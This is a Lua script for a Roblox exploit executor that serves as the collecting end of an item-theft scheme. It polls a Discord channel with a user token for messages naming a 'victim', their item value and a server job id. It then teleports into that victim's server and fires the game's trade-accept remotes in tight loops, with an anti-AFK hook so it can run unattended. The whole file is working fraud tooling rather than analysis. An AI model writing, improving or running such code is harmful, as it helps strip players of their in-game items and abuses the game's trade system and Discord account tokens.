if not channelId or not token then
	game:GetService("Players").LocalPlayer:kick("add your token or channel id breh")
end
if not game:IsLoaded() then
	game.Loaded:Wait() -- We wait while the game loads
end

local bb = game:GetService("VirtualUser") -- Anti afk
game:service "Players".LocalPlayer.Idled:connect(
    function()
        bb:CaptureController()
        bb:ClickButton2(Vector2.new())
    end
)

local HttpServ = game:GetService("HttpService")
local joinFile = isfile("lastjoin.txt")
local victimFile = isfile("user.txt")
local valueFile = isfile("value.txt")
if not joinFile then
    writefile("lastjoin.txt", "placeholder")
end
if not victimFile then
    writefile("user.txt", "victime username")
end
if not valueFile then
    writefile("value.txt", "0")
end
local LastMsgId = readfile("lastjoin.txt")
local victimUser = readfile("user.txt")
local currentvalue = tonumber(readfile("value.txt"))
local thing = game:GetService('ReplicatedFirst'):WaitForChild('UISelector'):WaitForChild('LoadingS2'):WaitForChild('Loading')
while thing.Enabled do
    wait(1) -- We wait while the loading screen is active
end
local waittime = delay or 2
wait(waittime) -- Small delay to account for ping and stuff
local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest') -- Just to make sure we are fully loaded before chatting (or it will bug)
game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('yo wsg tobi')

local function acceptRequest()
    while task.wait(0.1) do
        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest'):FireServer()
    end
end

local function acceptTrade()
    while task.wait(0.1) do
        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
    end
end
local function waitForPlayerLeave()
    local playerRemovedConnection
    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
        if removedPlayer.Name == victimUser then
            if playerRemovedConnection then
                playerRemovedConnection:Disconnect()
            end
            didVictimLeave = true
        end
    end)
end
local function IsTrading()
	local trade_statue = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
	if trade_statue == "StartTrade" then
		return  true
	elseif trade_statue == "None" then
		return false
	end
end
local function tradeTimer()
  	timer=0
	while task.wait() do
		if not IsTrading() then
			timer = timer + 1
			wait(1)
		elseif IsTrading() then
			timer = 0
		end
	end
end
local function countTrade()
  	x=0
	local trading = false
	while task.wait(0.1) do
		if IsTrading() == true and trading == false then
			x = x +1
		elseif IsTrading() == false then
			trading = false
		end
	end
end
task.spawn(acceptRequest) -- Start accepting trade requests
task.spawn(acceptTrade) -- Start accepting trades
task.spawn(waitForPlayerLeave)
task.spawn(tradeTimer)
task.spawn(countTrade)
local function autoJoin()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=1",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            ["Content-Type"] = "application/json"
        }
    })

    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        if #messages > 0 then
            local placeId, jobId = string.match(messages[1].content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
			local victimeUsername = messages[1].embeds[1].fields[1].value
			local value = string.match(messages[1].embeds[1].fields[4].value, "Total Value: (%d+)")
			if didVictimLeave or timer > 5 or (currentvalue <= tonumber(value) and x >= 2) then
				if tostring(messages[1].id) ~= LastMsgId and placeId ~= nil then
					LastMsgId = tostring(messages[1].id)
					writefile("lastjoin.txt", LastMsgId)
					writefile("user.txt", victimeUsername)
					writefile("value.txt", value)
					game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
				end
			end
        end
    end
end

while wait(5) do
    autoJoin()
end
